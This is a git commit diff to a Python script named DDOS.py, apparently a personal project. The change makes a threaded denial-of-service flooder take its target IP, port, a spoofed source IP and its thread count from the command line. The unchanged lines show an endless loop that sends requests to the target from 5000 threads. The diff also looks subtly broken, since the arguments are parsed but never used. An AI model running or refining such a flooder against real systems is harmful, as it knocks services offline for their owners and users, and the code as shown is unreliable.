fcee9bbd98a01d2c2d3f34c4efb128f4639f7860
Ghostwolf73 <solomzigumbo@gmail.com>
2024-11-13 18:58:19 +0200

    changed the IP and port section to get the IP addresses and ports from the user

--- DDOS.py
+++ DDOS.py
@@ -1,11 +1,15 @@
 import threading
 import socket
+import argparse
 
-target = '192.168.123.4'
-port = 22
-myIP = '192.168.123.1'
+# Set up argument parsing, get IP addresses and port numbers from the CLI as the script runs
+parser = argparse.ArgumentParser(description="DDoS attack simulation script.")
+parser.add_argument("target", type=str, help="Target IP address")
+parser.add_argument("port", type=int, help="Target port")
+parser.add_argument("spoofedIP", type=str, help="Spoofed source IP address to include in the request headers")
+parser.add_argument("--threads", type=int, default=100, help="Number of threads to launch (default: 100)")
 
-connected = 0
+# connected = 0
 
 def attack():
     while True:
@@ -15,9 +19,9 @@ def attack():
         s.sendto(("Host: " + myIP + "\r\n\r\n").encode('ascii'), (target, port))
         s.close()
 
-        global connected
-        connected += 1
-        print(connected)
+#        global connected
+#        connected += 1
+#        print(connected)
 
 for i in range(5000):
     thread = threading.Thread(target=attack)
